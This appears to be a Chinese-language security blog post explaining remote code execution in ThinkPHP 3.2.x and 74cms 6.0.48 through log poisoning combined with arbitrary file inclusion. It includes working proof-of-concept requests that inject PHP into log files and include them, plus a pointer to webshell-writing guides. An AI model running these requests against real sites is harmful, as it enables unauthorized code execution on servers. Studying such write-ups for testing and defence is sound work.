---
layout: post
title: "【网络安全】ThinkPHP 3.2.X RCE学习"
subtitle: "骑士CMS文件包含漏洞"
date: 2024-08-08
author: "3thernet"
header-img: "img/bg-touhou-1.jpg"
tags: []
---

## 0x01 ThinkPHP 3.2.X RCE

攻防遇到了很多的 ThinkPHP 3.2.x，本以为低版本TP有 RCE 可以打，但读了网上的文章后才发现并不是TP本身的问题，而是 assign 方法的第一个变量可控会造成任意文件包含，从而导致 RCE（换言之，一般是使用TP框架的程序员自己写控制器时写出了洞）。ThinkPHP 在`/Application/Runtime/Logs/Home/年份_月份_日期.log`下会记录 model 错误，构造特定的请求写入日志文件，然后用任意文件包含引入日志文件即可造成 RCE. 

在 debug 模式下，日志文件会直接泄露出来，如果没开 debug 模式也可尝试盲打。（注意 Application 可能修改为其他名称，比如data，可以尝试 fuzz）

```
若开启debug模式日志会到：\Application\Runtime\Logs\Home\下
若未开启debug模式日志会到：\Application\Runtime\Logs\Common\下
```

用 Burp 写入`/index.php?m=--><?=phpinfo();?>`（不要直接用浏览器写入）

日志如下：

![](/img/2024-08-08-thinkphp32x-rce/1.png)

自行搭建靶场测试请参考：

- [ThinkPHP3.2.X通用漏洞复现 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/12773)
- [炒冷饭之ThinkPHP3.2.X RCE漏洞分析 - sevck - 博客园 (cnblogs.com)](https://www.cnblogs.com/sevck/p/15012267.html)
- [【漏洞通报】ThinkPHP3.2.x RCE漏洞通报-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1855060)

## 0x02 骑士CMS RCE

骑士CMS 6.0.48 存在一处任意文件包含漏洞，与 ThinkPHP 3.2.X 通用RCE有些相似。

漏洞在于 assign_resume_tpl 方法：

```php
public function assign_resume_tpl($variable,$tpl){
        foreach ($variable as $key => $value) {
            $this->assign($key,$value);
        }
        return $this->fetch($tpl);
}
```

fetch 方法在`$tpl`不存在时会调用E方法将 payload 写入 log：

```php
// 模板文件不存在直接返回
if(!is_file($templateFile)) E(L('_TEMPLATE_NOT_EXIST_').':'.$templateFile);
```

fetch 方法还会调用`Hook:listen('view_parse', $params)`将模板文件解析与编译生成缓存文件`xxx.php`，然后调用Load加载这个编译好的缓存文件。

详细攻击链分析：

- [骑士 CMS 远程命令执行分析 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/8520)

- [骑士cms从任意文件包含到远程代码执行漏洞分析 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/8596)

`$tpl`变量可控，因此可以先通过 assign_resume_tpl 的 fetch 方法将 payload 写入log，再通过 assign_resume_tpl 方法包含存在 payload 的 log 文件。

也可以一步到位，直接通过 assign_resume_tpl 方法包含木马文件。根据上面两篇文章，官方的补丁包只是阻止 payload 写入日志，并没有阻止任意文件包含。（过去这么久应该修复了吧？）

POC:

```
POST /index.php?m=home&a=assign_resume_tpl HTTP/1.1
Host:

variable=1&tpl=<?php phpinfo(); ob_flush();?>
```

访问`http://example.com/index.php?m=home&a=assign_resume_tpl&variable=1&tpl=data/Runtime/Logs/Home/年份_月份_日期.log`即可看到回显。注意由于 fetch 中包含`ob_get_clean`，所以必须要包含`ob_flush();`。

如果POC出现404，那么大概率是被修复了。

写马参考：

- [74cms 6.0.20版本文件包含漏洞复现_74cms v6 源码-CSDN博客](https://blog.csdn.net/csdnmmd/article/details/117689687)

# 
